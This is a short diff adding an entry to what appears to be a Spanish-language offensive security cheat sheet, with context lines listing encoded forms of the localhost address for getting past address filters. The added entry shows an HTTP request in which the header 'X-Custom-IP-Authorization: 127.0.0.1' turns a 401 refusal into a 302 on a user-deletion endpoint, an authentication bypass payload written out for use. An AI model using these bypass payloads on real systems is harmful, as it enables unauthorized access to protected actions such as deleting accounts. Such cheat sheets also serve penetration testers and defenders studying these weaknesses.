@@ -352,3 +352,17 @@ http://0x7f000001/
 http://017700000001
 http://0177.00.00.01
 ```
+
+**Autentication Bypass con el header "X-Custom-IP-Authorization"**
+```http
+Request
+GET /delete?user=pedro HTTP/1.1
+Response
+HTTP/1.1 401 Unauthorized
+
+Request
+GET /delete?user=pedro HTTP/1.1
+X-Custom-IP-Authorization: 127.0.0.1
+Response
+HTTP/1.1 302 Found
+```
